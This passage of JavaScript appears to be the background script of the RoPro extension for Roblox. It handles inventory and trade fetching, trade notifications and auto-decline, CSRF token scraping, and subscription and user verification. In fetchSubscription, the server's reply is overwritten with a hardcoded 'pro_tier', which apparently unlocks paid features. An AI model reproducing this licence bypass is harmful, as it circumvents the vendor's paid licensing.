	console.log("Inventory loaded. Total items: " + total)
	return myInventory
}

async function loadInventory(userID) {
	myInventory = {}
	assetType = null
	async function handleAsset(cursor) {
		response = await getPage(userID, assetType, cursor)
		for (j = 0; j < response.data.length; j++) {
			item = response.data[j]
			if (item['assetId'] in myInventory) {
				myInventory[item['assetId']]['quantity']++
			} else {
				myInventory[item['assetId']] = item
				myInventory[item['assetId']]['quantity'] = 1
			}
		}
		if (response.nextPageCursor != null) {
			await handleAsset(response.nextPageCursor)
		}
	}
	await handleAsset("")
	total = 0
	for (item in myInventory) {
	  total += myInventory[item]['quantity']
	}
	console.log("Inventory loaded. Total items: " + total)
	return myInventory
}

async function isInventoryPrivate(userID) {
	return new Promise(resolve => {
		$.ajax({
			url: 'https://inventory.roblox.com/v1/users/' + userID + '/assets/collectibles?cursor=&sortOrder=Desc&limit=10&assetType=null',
			type: 'GET',
			success: function(data) {
				resolve(false)
			},
			error: function(r) {
				if (r.status == 403) {
					resolve(true)
				} else {
					resolve(false)
				}
			}
		})
	})
}

async function loadLimitedInventory(userID) {
	var myInventory = []
	var assetType = null
	async function handleAsset(cursor) {
		response = await getPage(userID, assetType, cursor)
		for (j = 0; j < response.data.length; j++) {
			item = response.data[j]
			myInventory.push(item)
		}
		if (response.nextPageCursor != null) {
			await handleAsset(response.nextPageCursor)
		}
	}
	await handleAsset("")
	return myInventory
}

async function getProfileValue(userID) {
	if (await isInventoryPrivate(userID)) {
		return {"value": "private"}
	}
	var inventory = await loadLimitedInventory(userID)
	var items = new Set()
	for (var i = 0; i < inventory.length; i++) {
		items.add(inventory[i]['assetId'])
	}
	var values = await fetchItemValues(Array.from(items))
	var value = 0
	for (var i = 0; i < inventory.length; i++) {
		if (inventory[i]['assetId'] in values) {
			value += values[inventory[i]['assetId']]
		}
	}
	return {"value": value}
}

function fetchTrades(tradesType, limit) {
	return new Promise(resolve => {
		$.get("https://trades.roblox.com/v1/trades/" + tradesType + "?cursor=&limit=" + limit + "&sortOrder=Desc", async function(data) {
			resolve(data)
		})
	})
}

function fetchTradesCursor(tradesType, limit, cursor) {
	return new Promise(resolve => {
		$.get("https://trades.roblox.com/v1/trades/" + tradesType + "?cursor=" + cursor + "&limit=" + limit + "&sortOrder=Desc", function(data) {
			resolve(data)
		})
	})
}

function fetchTrade(tradeId) {
	return new Promise(resolve => {
		$.get("https://trades.roblox.com/v1/trades/" + tradeId, function(data) {
			resolve(data)
		})
	})
}

function fetchValues(trades) {
	return new Promise(resolve => {
		$.ajax({
			url:'https://api.ropro.io/tradeProtectionBackend.php',
			type:'POST',
			data: trades,
			success: function(data) {
				resolve(data)
			}
		})
	})
}

function fetchItemValues(items) {
	return new Promise(resolve => {
		$.ajax({
			url:'https://api.ropro.io/itemInfoBackend.php',
			type:'POST',
			data: JSON.stringify(items),
			success: function(data) {
				resolve(data)
			}
		})
	})
}

function fetchPlayerThumbnails(userIds) {
	return new Promise(resolve => {
		$.get("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + userIds.join() + "&size=420x420&format=Png&isCircular=false", function(data) {
			resolve(data)
		})
	})
}

function cancelTrade(id, token) {
	return new Promise(resolve => {
		$.ajax({
			url:'https://trades.roblox.com/v1/trades/' + id + '/decline',
			headers: {'X-CSRF-TOKEN':token},
			type:'POST',
			success: function(data) {
				resolve(data)
			},
			error: function(xhr, ajaxOptions, thrownError) {
				resolve("")
			}
		})
	})
}

async function doFreeTrialActivated() {
	chrome.tabs.create({url: "https://ropro.io?installed"})
}

function addCommas(nStr){
	nStr += '';
	var x = nStr.split('.');
	var x1 = x[0];
	var x2 = x.length > 1 ? '.' + x[1] : '';
	var rgx = /(\d+)(\d{3})/;
	while (rgx.test(x1)) {
		x1 = x1.replace(rgx, '$1' + ',' + '$2');
	}
	return x1 + x2;
}

var myToken = null;

function loadToken() {
	return new Promise(resolve => {
		try {
			$.ajax({
				url:'https://roblox.com/home',
				type:'GET',
				success: function(data) {
					token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
					restrictSettings = !(data.includes('data-isunder13=false') || data.includes('data-isunder13="false"') || data.includes('data-isunder13=\'false\''))
					myToken = token
					chrome.storage.sync.set({'token': myToken})
					chrome.storage.sync.set({'restrictSettings': restrictSettings})
					resolve(token)
				}
			}).fail(function() {
				$.ajax({
					url:'https://roblox.com',
					type:'GET',
					success: function(data) {
						token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
						restrictSettings = !data.includes('data-isunder13=false')
						myToken = token
						chrome.storage.sync.set({'token': token})
						chrome.storage.sync.set({'restrictSettings': restrictSettings})
						resolve(token)
					}
				}).fail(function() {
					$.ajax({
						url:'https://www.roblox.com/home',
						type:'GET',
						success: function(data) {
							token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
							restrictSettings = !data.includes('data-isunder13=false')
							myToken = token
							chrome.storage.sync.set({'token': token})
							chrome.storage.sync.set({'restrictSettings': restrictSettings})
							resolve(token)
						}
					}).fail(function() {
						$.ajax({
							url:'https://web.roblox.com/home',
							type:'GET',
							success: function(data) {
								token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
								restrictSettings = !data.includes('data-isunder13=false')
								myToken = token
								chrome.storage.sync.set({'token': token})
								chrome.storage.sync.set({'restrictSettings': restrictSettings})
								resolve(token)
							}
						})
					})
				})
			})
		} catch(e) {
			console.log(e)
			console.log("TOKEN FETCH FAILED, PERFORMING BACKUP TOKEN FETCH")
			$.post('https://catalog.roblox.com/v1/catalog/items/details').fail(function(r,e,s){
				token = r.getResponseHeader('x-csrf-token')
				myToken = token
				chrome.storage.sync.set({'token': token})
				console.log("New Token: " + token)
				resolve(token)
			})
		}
	})
}

async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);                    
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    return hashHex;
}

async function handleAlert() {
	timestamp = new Date().getTime()
	$.ajax({
		url:"https://api.ropro.io/handleRoProAlert.php?timestamp=" + timestamp,
		type:'GET',
		success: async function(data, error, response) {
			data = JSON.parse(atob(data))
			if (data.alert == true) {
				validationHash = "d6ed8dd6938b1d02ef2b0178500cd808ed226437f6c23f1779bf1ae729ed6804"
				validation = response.getResponseHeader('validation' + (await sha256(timestamp % 1024)).split("a")[0])
				if (await sha256(validation) == validationHash) {
					alreadyAlerted = await getLocalStorage("alreadyAlerted")
					linkHTML = ""
					if (data.hasOwnProperty('link') && data.hasOwnProperty('linktext')) {
						linkHTML = `<a href=\'${stripTags(data.link)}\' target=\'_blank\' style=\'margin-left:10px;text-decoration:underline;\' class=\'text-link\'><b>${stripTags(data.linktext)}</b></a>`
					}
					closeAlertHTML = `<div style=\'opacity:0.6;margin-right:5px;display:inline-block;margin-left:45px;cursor:pointer;\'class=\'alert-close\'><b>Close Alert<b></div>`
					message = stripTags(data.message) + linkHTML + closeAlertHTML
					if (alreadyAlerted != message) {
						setLocalStorage("rpAlert", message)
					}
				} else {
					console.log("Validation failed! Not alerting user.")
					setLocalStorage("rpAlert", "")
				}
			} else {
				setLocalStorage("rpAlert", "")
			}
		}
	})
}

handleAlert()
setInterval(function() {
	handleAlert() //Check for RoPro alerts every 10 minutes
}, 10 * 60 * 1000)

const SubscriptionManager = () => {
	let subscription = getStorage('rpSubscription')
	let date = Date.now()
	function fetchSubscription() {
		return new Promise(resolve => {
			async function doGet(resolve) {
				verificationDict = await getStorage('userVerification')
				userID = await getStorage('rpUserID')
				roproVerificationToken = "none"
				if (typeof verificationDict != 'undefined') {
					if (verificationDict.hasOwnProperty(userID)) {
						roproVerificationToken = verificationDict[userID]
					}
				}
				$.post({url:"https://api.ropro.io/getSubscription.php?key=" + await getStorage("subscriptionKey") + "&userid=" + userID, headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID}}, function(data){
					data = "pro_tier"
					subscription = data
					setStorage("rpSubscription", data)
					resolve(data);
				}).fail(async function() {
					resolve(await getStorage("rpSubscription"))
				})
			}
			doGet(resolve)
		})
	};
	const resetDate = () => {
		date = Date.now() - 310 * 1000
	};
	const getSubscription = () => {
		return new Promise(resolve => {
			async function doGetSub() {
				currSubscription = subscription
				if (typeof currSubscription == 'undefined' || currSubscription == null || Date.now() >= date + 305 * 1000) {
					subscription = await fetchSubscription()
					currSubscription = subscription
					date = Date.now()
				}
				resolve(currSubscription);
			}
			doGetSub()
		})
	};
	const validateLicense = () => {
			$.get('https://users.roblox.com/v1/users/authenticated', function(d1, e1, r1) {
					console.log(r1)
					async function doValidate() {
						freeTrialActivated = await getStorage("freeTrialActivated")
						if (typeof freeTrialActivated != "undefined") {
							freeTrial = ""
						} else {
							freeTrial = "?free_trial=true"
						}
						verificationDict = await getStorage('userVerification')
						userID = await getStorage('rpUserID')
						roproVerificationToken = "none"
						if (typeof verificationDict != 'undefined') {
							if (verificationDict.hasOwnProperty(userID)) {
								roproVerificationToken = verificationDict[userID]
							}
						}
						$.ajax({
							url:'https://api.ropro.io/validateUser.php' + freeTrial,
							type:'POST',
							headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID},
							data: {'verification': `${btoa(unescape(encodeURIComponent(JSON.stringify(r1))))}`},
							success: async function(data, status, xhr) {
								if (data == "err") {
									console.log("User Validation failed. Please contact support: https://ropro.io/support")
								} else if (data.includes(",")) {
									userID = parseInt(data.split(",")[0]);
									username = data.split(",")[1].split(",")[0];
									setStorage("rpUserID", userID);
									setStorage("rpUsername", username);
									if (data.includes("pro_tier_free_trial_just_activated") && freeTrial.length > 0) {
										setStorage("freeTrialActivated", true)
										doFreeTrialActivated()
									}
								}
								if (xhr.getResponseHeader("ropro-subscription-tier") != null) {
									console.log(xhr.getResponseHeader("ropro-subscription-tier"))
									setStorage("rpSubscription", xhr.getResponseHeader("ropro-subscription-tier"))
								} else {
									syncSettings()
								}
							}
						})
					}
					doValidate()
			})
	};
	return {
	  getSubscription,
	  resetDate,
	  validateLicense
	};
}
const subscriptionManager = SubscriptionManager();

async function syncSettings() {
	subscriptionManager.resetDate()
	subscriptionLevel = await subscriptionManager.getSubscription()
	setStorage("rpSubscription", subscriptionLevel)
}

async function loadSettingValidity(setting) {
	settings = await getStorage('rpSettings')
	restrictSettings = await getStorage('restrictSettings')
	restricted_settings = new Set(["linkedDiscord", "gameTwitter", "groupTwitter", "groupDiscord", "featuredToys"])
	standard_settings = new Set(["themeColorAdjustments", "moreMutuals", "animatedProfileThemes", "morePlaytimeSorts", "serverSizeSort", "fastestServersSort", "moreGameFilters", "moreServerFilters", "additionalServerInfo", "gameLikeRatioFilter", "premiumVoiceServers", "quickUserSearch", "liveLikeDislikeFavoriteCounters", "sandboxOutfits", "tradeSearch", "moreTradePanel", "tradeValueCalculator", "tradeDemandRatingCalculator", "tradeItemValue", "tradeItemDemand", "itemPageValueDemand", "tradePageProjectedWarning", "embeddedRolimonsItemLink", "embeddedRolimonsUserLink", "tradeOffersValueCalculator", "winLossDisplay", "underOverRAP"])
	pro_settings = new Set(["profileValue", "liveVisits", "livePlayers", "tradePreviews", "ownerHistory", "quickItemSearch", "tradeNotifier", "singleSessionMode", "advancedTradeSearch", "tradeProtection", "hideTradeBots", "autoDeclineTradeBots", "autoDecline", "declineThreshold", "cancelThreshold", "hideDeclinedNotifications", "hideOutboundNotifications"])
	ultra_settings = new Set(["dealNotifier", "buyButton", "dealCalculations", "notificationThreshold", "valueThreshold", "projectedFilter"])
	subscriptionLevel = await subscriptionManager.getSubscription()
	valid = true
	if (subscriptionLevel == "free_tier" || subscriptionLevel == "free") {
		if (standard_settings.has(setting) || pro_settings.has(setting) || ultra_settings.has(setting)) {
			valid = false
		}
	} else if (subscriptionLevel == "standard_tier" || subscriptionLevel == "plus") {
		if (pro_settings.has(setting) || ultra_settings.has(setting)) {
			valid = false
		}
	} else if (subscriptionLevel == "pro_tier" || subscriptionLevel == "rex") {
		if (ultra_settings.has(setting)) {
			valid = false
		}
	} else if (subscriptionLevel == "ultra_tier" || subscriptionLevel == "ultra") {
		valid = true
	} else {
		valid = false
	}
	if (restricted_settings.has(setting) && restrictSettings) {
		valid = false
	}
	if (disabledFeatures.includes(setting)) {
		valid = false
	}
	return new Promise(resolve => {
		resolve(valid)
	})
}

async function loadSettings(setting) {
	settings = await getStorage('rpSettings')
	if (typeof settings === "undefined") {
		await initializeSettings()
		settings = await getStorage('rpSettings')
	}
	valid = await loadSettingValidity(setting)
	if (typeof settings[setting] === "boolean") {
		settingValue = settings[setting] && valid
	} else {
		settingValue = settings[setting]
	}
	return new Promise(resolve => {
		resolve(settingValue)
	})
}

async function loadSettingValidityInfo(setting) {
	disabled = false
	valid = await loadSettingValidity(setting)
	if (disabledFeatures.includes(setting)) {
		disabled = true
	}
	return new Promise(resolve => {
		resolve([valid, disabled])
	})
}

async function getTradeValues(tradesType) {
	tradesJSON = await fetchTrades(tradesType)
	cursor = tradesJSON.nextPageCursor
	trades = {data: []}
	if (tradesJSON.data.length > 0) {
		for (i = 0; i < 1; i++) {
			offer = tradesJSON.data[i]
			tradeChecked = await getStorage("tradeChecked")
			if (offer.id != tradeChecked) {
				trade = await fetchTrade(offer.id)
				trades.data.push(trade)
			} else {
				return {}
			}
		}
		tradeValues = await fetchValues(trades)
		return tradeValues
	} else {
		return {}
	}
}

var inbounds = []
var inboundsCache = {}
var allPagesDone = false
var loadLimit = 25
var totalCached = 0

function loadTrades(inboundCursor, tempArray) {
    $.get('https://trades.roblox.com/v1/trades/Inbound?sortOrder=Asc&limit=100&cursor=' + inboundCursor, function(data){
        console.log(data)
        done = false
        for (i = 0; i < data.data.length; i++) {
            if (!(data.data[i].id in inboundsCache)) {
                tempArray.push(data.data[i].id)
                inboundsCache[data.data[i].id] = null
            } else {
                done = true
                break
            }
        }
        if (data.nextPageCursor != null && done == false) {
            loadTrades(data.nextPageCursor, tempArray)
        } else { //Reached the last page or already detected inbound trade
            inbounds = tempArray.concat(inbounds)
            allPagesDone = true
            setTimeout(function() {
                loadTrades("", [])
            }, 61000)
        }
    }).fail(function() {
        setTimeout(function() {
            loadTrades(inboundCursor, tempArray)
        }, 61000)
    })
}

async function populateInboundsCache() {
	if (await loadSettings("tradeNotifier")) {
		loadLimit = 25
	} else if (await loadSettings('moreTradePanel') || await loadSettings('tradePreviews')) {
		loadLimit = 20
	} else {
		loadLimit = 0
	}
    loaded = 0
    totalCached = 0
    newTrade = false
    for (i = 0; i < inbounds.length; i++) {
        if (loaded >= loadLimit) {
            break
        }
        if (inbounds[i] in inboundsCache && inboundsCache[inbounds[i]] == null) {
            loaded++
            function loadInbound(id, loaded, i) {
                $.get('https://trades.roblox.com/v1/trades/' + id, function(data) {
                    console.log(data)
                    inboundsCache[data.id] = data
                    newTrade = true
                })
            }
            loadInbound(inbounds[i], loaded, i)
        } else if (inbounds[i] in inboundsCache) {
            totalCached++
        }
    }
    setTimeout(function() {
		inboundsCacheSize = Object.keys(inboundsCache).length
        if (allPagesDone && newTrade == true) {
            setLocalStorage("inboundsCache", inboundsCache)
            if (inboundsCacheSize > 0) {
                percentCached = (totalCached / inboundsCacheSize * 100).toFixed(2)
                console.log("Cached " + percentCached + "% of Inbound Trades (Cache Rate: " + loadLimit + "/min)")
            }
        }
    }, 10000)
    setTimeout(function() {
        populateInboundsCache()
    }, 65000)
}

async function initializeInboundsCache() {
	inboundsCacheInitialized = true
	setTimeout(function() {
		populateInboundsCache()
	}, 10000)
    savedInboundsCache = await getLocalStorage("inboundsCache")
    if (typeof savedInboundsCache != 'undefined') {
        inboundsCache = savedInboundsCache
        inboundsTemp = Object.keys(inboundsCache)
		currentTime = new Date().getTime()
        for (i = 0; i < inboundsTemp.length; i++) {
			if (inboundsCache[parseInt(inboundsTemp[i])] != null && 'expiration' in inboundsCache[parseInt(inboundsTemp[i])] && currentTime > new Date(inboundsCache[parseInt(inboundsTemp[i])].expiration).getTime()) {
				delete inboundsCache[parseInt(inboundsTemp[i])]
			} else {
            	inbounds.push(parseInt(inboundsTemp[i]))
			}
        }
		setLocalStorage("inboundsCache", inboundsCache)
        inbounds = inbounds.reverse()
    }
    loadTrades("", [])
}

var inboundsCacheInitialized = false;

initializeInboundsCache()

var tradesNotified = {};
var tradeCheckNum = 0;

function getTrades(initial) {
	return new Promise(resolve => {
		async function doGet(resolve) {
			tradeCheckNum++
			if (initial) {
				limit = 25
			} else {
				limit = 10
			}
			sections = [await fetchTrades("inbound", limit), await fetchTrades("outbound", limit)]
			if (initial || tradeCheckNum % 2 == 0) {
				sections.push(await fetchTrades("completed", limit))
			}
			if (await loadSettings("hideDeclinedNotifications") == false && tradeCheckNum % 4 == 0) {
				sections.push(await fetchTrades("inactive", limit))
			}
			tradesList = await getStorage("tradesList")
			if (typeof tradesList == 'undefined' || initial) {
				tradesList = {"inboundTrades":{}, "outboundTrades":{}, "completedTrades":{}, "inactiveTrades":{}}
			}
			storageNames = ["inboundTrades", "outboundTrades", "completedTrades", "inactiveTrades"]
			newTrades = []
			newTrade = false
			tradeCount = 0
			for (i = 0; i < sections.length; i++) {
				section = sections[i]
				if ('data' in section && section.data.length > 0) {
					store = tradesList[storageNames[i]]
					tradeIds = []
					for (j = 0; j < section.data.length; j++) {
						tradeIds.push(section.data[j]['id'])
					}
					for (j = 0; j < tradeIds.length; j++) {
						tradeId = tradeIds[j]
						if (!(tradeId in store)) {
							tradesList[storageNames[i]][tradeId] = true
							newTrades.push({[tradeId]: storageNames[i]})
						}
					}
				}
			}
			if (newTrades.length > 0) {
				if (!initial) {
					await setStorage("tradesList", tradesList)
					if (newTrades.length < 9) {
						notifyTrades(newTrades)
					}
				} else {
					await setStorage("tradesList", tradesList)
				}
			}
			/** if (await loadSettings("tradePreviews")) {
				cachedTrades = await getLocalStorage("cachedTrades")
				for (i = 0; i < sections.length; i++) {
					myTrades = sections[i]
					if (i != 0 && 'data' in myTrades && myTrades.data.length > 0) {
						for (i = 0; i < myTrades.data.length; i++) {
							trade = myTrades.data[i]
							if (tradeCount < 10) {
								if (!(trade.id in cachedTrades)) {
									cachedTrades[trade.id] = await fetchTrade(trade.id)
									tradeCount++
									newTrade = true
								}
							} else {
								break
							}
						}
						if (newTrade) {
							setLocalStorage("cachedTrades", cachedTrades)
						}
					}
				}
			} **/
			resolve(0)
		}
		doGet(resolve)
	})
}

function loadTradesType(tradeType) {
	return new Promise(resolve => {
        function doLoad(tradeCursor, tempArray) {
            $.get('https://trades.roblox.com/v1/trades/' + tradeType + '?sortOrder=Asc&limit=100&cursor=' + tradeCursor, function(data){
                console.log(data)
                for (i = 0; i < data.data.length; i++) {
                    tempArray.push([data.data[i].id, data.data[i].user.id])
                }
                if (data.nextPageCursor != null) {
                    doLoad(data.nextPageCursor, tempArray)
                } else { //Reached the last page
                    resolve(tempArray)
                }
            }).fail(function() {
                setTimeout(function() {
                    doLoad(tradeCursor, tempArray)
                }, 31000)
            })
        }
        doLoad("", [])
	})
}

function loadTradesData(tradeType) {
	return new Promise(resolve => {
        function doLoad(tradeCursor, tempArray) {
            $.get('https://trades.roblox.com/v1/trades/' + tradeType + '?sortOrder=Asc&limit=100&cursor=' + tradeCursor, function(data){
                console.log(data)
                for (i = 0; i < data.data.length; i++) {
                    tempArray.push(data.data[i])
                }
                if (data.nextPageCursor != null) {
                    doLoad(data.nextPageCursor, tempArray)
                } else { //Reached the last page
                    resolve(tempArray)
                }
            }).fail(function() {
                setTimeout(function() {
                    doLoad(tradeCursor, tempArray)
                }, 31000)
            })
        }
        doLoad("", [])
	})
}


var notifications = {}

setLocalStorage("cachedTrades", {})

async function notifyTrades(trades) {
	for (i = 0; i < trades.length; i++) {
		trade = trades[i]
		tradeId = Object.keys(trade)[0]
		tradeType = trade[tradeId]
		if (!(tradeId + "_" + tradeType in tradesNotified)) {
			tradesNotified[tradeId + "_" + tradeType] = true
			context = ""
			buttons = []
			switch (tradeType) {
				case "inboundTrades":
					context = "Trade Inbound"
					buttons = [{title: "Open"}, {title: "Decline"}]
					break;
				case "outboundTrades":
					context = "Trade Outbound"
					buttons = [{title: "Open"}, {title: "Cancel"}]
					break;
				case "completedTrades":
					context = "Trade Completed"
					buttons = [{title: "Open"}]
					break;
				case "inactiveTrades":
					context = "Trade Declined"
					buttons = [{title: "Open"}]
					break;
			}
			trade = await fetchTrade(tradeId)
			values = await fetchValues({data: [trade]})
			values = values[0]
			compare = values[values['them']] - values[values['us']]
			lossRatio = (1 - values[values['them']] / values[values['us']]) * 100
			console.log("Trade Loss Ratio: " + lossRatio)
			if (context == "Trade Inbound" && await loadSettings("autoDecline") && lossRatio >= await loadSettings("declineThreshold")) {
				console.log("Declining Trade, Trade Loss Ratio: " + lossRatio)
				cancelTrade(tradeId, await getStorage("token"))
			}
			if (context == "Trade Outbound" && await loadSettings("tradeProtection") && lossRatio >= await loadSettings("cancelThreshold")) {
				console.log("Cancelling Trade, Trade Loss Ratio: " + lossRatio)
				cancelTrade(tradeId, await getStorage("token"))
			}
			if (await loadSettings("tradeNotifier")) {
				compareText = "Win: +"
				if (compare > 0) {
					compareText = "Win: +"
				} else if (compare == 0) {
					compareText = "Equal: +"
				} else if (compare < 0) {
					compareText = "Loss: "
				}
				var thumbnail = await fetchPlayerThumbnails([trade.user.id])
				options = {type: "basic", title: context, iconUrl: thumbnail.data[0].imageUrl, buttons: buttons, priority: 2, message:`Partner: ${values['them']}\nYour Value: ${addCommas(values[values['us']])}\nTheir Value: ${addCommas(values[values['them']])}`, contextMessage: compareText + addCommas(compare) + " Value", eventTime: Date.now()}
				notificationId = Math.floor(Math.random() * 10000000).toString()
				notifications[notificationId] = {type: "trade", tradeType: tradeType, tradeid: tradeId, buttons: buttons}
				if (context != "Trade Declined" || await loadSettings("hideDeclinedNotifications") == false) {
					await createNotification(notificationId, options)
				}
			}
		}
	}
}
var tradeNotifierInitialized = false
setTimeout(function() {
	setInterval(async function() {
		if (await loadSettings("tradeNotifier") || await loadSettings("autoDecline") || await loadSettings("tradeProtection")) {
			getTrades(!tradeNotifierInitialized)
			tradeNotifierInitialized = true
		} else {
			tradeNotifierInitialized = false
		}
	}, 20000)
}, 10000)

async function initialTradesCheck() {
	if (await loadSettings("tradeNotifier") || await loadSettings("autoDecline") || await loadSettings("tradeProtection")) {
		getTrades(true)
		tradeNotifierInitialized = true
	}
}

async function initializeCache() {
	if (await loadSettings("tradePreviews")) {
		cachedTrades = await getLocalStorage("cachedTrades")
		if (typeof cachedTrades == 'undefined') {
			console.log("Initializing Cache...")
			setLocalStorage("cachedTrades", {"initialized": new Date().getTime()})
		} else if (cachedTrades['initialized'] + 24 * 60 * 60 * 1000 < new Date().getTime() || typeof cachedTrades['initialized'] == 'undefined') {
			console.log("Initializing Cache...")
			setLocalStorage("cachedTrades", {"initialized": new Date().getTime()})
		}
	}
}

initializeCache()

async function cacheTrades() {
	if (await loadSettings("tradePreviews")) {
		cachedTrades = await getLocalStorage("cachedTrades")
		tradesLoaded = 0
		index = 0
		tradeTypes = ["inbound", "outbound", "completed", "inactive"]
		async function loadTradeType(tradeType) {
			myTrades = await fetchTradesCursor(tradeType, 100, "")
			for (i = 0; i < myTrades.data.length; i++) {
				trade = myTrades.data[i]
				if (tradesLoaded <= 20) {
					if (!(trade.id in cachedTrades)) {
						cachedTrades[trade.id] = await fetchTrade(trade.id)
						tradesLoaded++
					}
				} else {
					break
				}
			}
			setLocalStorage("cachedTrades", cachedTrades)
			if (tradesLoaded <= 20 && index < 3) {
				index++
				loadTradeType(tradeTypes[index])
			}
		}
		loadTradeType(tradeTypes[index])
	}
}

setTimeout(function(){
	initialTradesCheck()
}, 5000)

async function toggle(feature) {
	features = await getStorage("rpFeatures")
	featureBool = features[feature]
	if (featureBool) {
		features[feature] = false
	} else {
		features[feature] = true
	}
	await setStorage("rpFeatures", features)
}

setInterval(async function(){
	loadToken()
}, 120000)
loadToken()

setInterval(async function(){
	subscriptionManager.validateLicense()
}, 300000)
subscriptionManager.validateLicense()

function generalNotification(notification) {
	console.log(notification)
	var notificationOptions = {
		type: "basic",
		title: notification.subject,
		message: notification.message,
		priority: 2,
		iconUrl: notification.icon
	}
	chrome.notifications.create("", notificationOptions)
}

async function notificationButtonClicked(notificationId, buttonIndex) { //Notification button clicked
	notification = notifications[notificationId]
	if (notification['type'] == 'trade') {
		if (notification['tradeType'] == 'inboundTrades') {
			if (buttonIndex == 0) {
				chrome.tabs.create({ url: "https://www.roblox.com/trades" })
			} else if (buttonIndex == 1) {
				cancelTrade(notification['tradeid'], await getStorage('token'))
			}
		} else if (notification['tradeType'] == 'outboundTrades') {
			if (buttonIndex == 0) {
				chrome.tabs.create({ url: "https://www.roblox.com/trades#outbound" })
			} else if (buttonIndex == 1) {
				cancelTrade(notification['tradeid'], await getStorage('token'))
			}
		} else if (notification['tradeType'] == 'completedTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#completed" })
		} else if (notification['tradeType'] == 'inactiveTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#inactive" })
		}
	}
}

function notificationClicked(notificationId) {
	console.log(notificationId)
	notification = notifications[notificationId]
	console.log(notification)
	if (notification['type'] == 'trade') {
		if (notification['tradeType'] == 'inboundTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades" })
		}
		else if (notification['tradeType'] == 'outboundTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#outbound" })
		}
		else if (notification['tradeType'] == 'completedTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#completed" })
		}
		else if (notification['tradeType'] == 'inactiveTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#inactive" })
		}
	} else if (notification['type'] == 'wishlist') {
		chrome.tabs.create({ url: "https://www.roblox.com/catalog/" + parseInt(notification['itemId']) + "/" })
	}
}

chrome.notifications.onClicked.addListener(notificationClicked)

chrome.notifications.onButtonClicked.addListener(notificationButtonClicked)

setInterval(function(){
	$.get("https://api.ropro.io/disabledFeatures.php", function(data) {
		disabledFeatures = data
	})
}, 300000)

async function initializeMisc() {
	avatarBackground = await getStorage('avatarBackground')
	if (typeof avatarBackground === "undefined") {
		await setStorage("avatarBackground", "default")
	}
	globalTheme = await getStorage('globalTheme')
	if (typeof globalTheme === "undefined") {
		await setStorage("globalTheme", "")
	}
	try {
		var myId = await getStorage('rpUserID')
		if (typeof myId != "undefined" && await loadSettings('globalThemes')) {
			loadGlobalTheme()
		}
	} catch(e) {
		console.log(e)
	}
}
initializeMisc()

async function loadGlobalTheme() {
	var myId = await getStorage('rpUserID')
	$.post('https://api.ropro.io/getProfileTheme.php?userid=' + parseInt(myId), async function(data){
		if (data.theme != null) {
			await setStorage("globalTheme", data.theme)
		}
	})
}

function updateToken() {
	return new Promise(resolve => {
		$.post('https://catalog.roblox.com/v1/catalog/items/details').fail(function(r,e,s){
			token = r.getResponseHeader('x-csrf-token')
			myToken = token
			chrome.storage.sync.set({'token': token})
			resolve(token)
		})
	})
}

async function checkWishlist() {
	verificationDict = await getStorage('userVerification')
	userID = await getStorage('rpUserID')
	roproVerificationToken = "none"
	if (typeof verificationDict != 'undefined') {
		if (verificationDict.hasOwnProperty(userID)) {
			roproVerificationToken = verificationDict[userID]
		}
	}
	$.post({'url': 'https://api.ropro.io/wishlistCheck.php', 'headers': {'ropro-verification': roproVerificationToken, 'ropro-id': userID}}, async function(data) {
		if (Object.keys(data).length > 0) {
			await updateToken()
			var payload = {"items": []}
			var prices = {}
			for (const [id, item] of Object.entries(data)) {
				if (parseInt(Math.abs((parseInt(item['currPrice']) - parseInt(item['prevPrice'])) / parseInt(item['prevPrice']) * 100)) >= 10) {
					if (item['type'] == 'asset') {
						payload['items'].push({"itemType": "Asset","id": parseInt(id)})
					}
					prices[parseInt(id)] = [parseInt(item['prevPrice']), parseInt(item['currPrice'])]
				}
			}
			$.post({'url': 'https://catalog.roblox.com/v1/catalog/items/details', 'headers': {'X-CSRF-TOKEN': myToken, 'Content-Type': 'application/json'}, data: JSON.stringify(payload)}, async function(data) {
				console.log(data)
				for (var i = 0; i < data.data.length; i++) {
					var item = data.data[i]
					$.get('https://api.ropro.io/getAssetThumbnailUrl.php?id=' + item.id, function(imageUrl) {
						var options = {type: "basic", title: item.name, iconUrl: imageUrl, priority: 2, message:'Old Price: ' + prices[item.id][0] + ' Robux\nNew Price: ' + prices[item.id][1] + ' Robux', contextMessage: 'Price Fell By ' + parseInt(Math.abs((prices[item.id][1] - prices[item.id][0]) / prices[item.id][0] * 100)) + '%', eventTime: Date.now()}
						var notificationId = Math.floor(Math.random() * 1000000).toString()
						notifications[notificationId] = {type: "wishlist", itemId: item.id}
						createNotification(notificationId, options)
					})
				}
			})
		}
	})
}

//RoPro's user verification system is different in RoPro v2.0, and includes support for Roblox OAuth2 authentication.
//In RoPro v1.5, we only support ingame verification via our "RoPro User Verification" experience on Roblox: https://www.roblox.com/games/16699976687/RoPro-User-Verification
function verifyUser(emoji_verification_code) {
	return new Promise(resolve => {
		async function doVerify(resolve) {
			try {
				$.post('https://api.ropro.io/ingameVerification.php', {'emoji_verification_code': emoji_verification_code}, async function(data) {
					var verificationToken = data.token
					var myId = await getStorage('rpUserID')
					if (verificationToken != null && verificationToken.length == 25 && myId == data.userid) {
						console.log("Successfully verified.")
						var verificationDict = await getStorage('userVerification')
						verificationDict[myId] = verificationToken
						await setStorage('userVerification', verificationDict)
						resolve("success")
					} else {
						resolve(null)
					}
				}).fail(function(r,e,s){
					resolve(null)
				})
			} catch(e) {
				resolve(null)
			}
		}
		doVerify(resolve)
	})
}

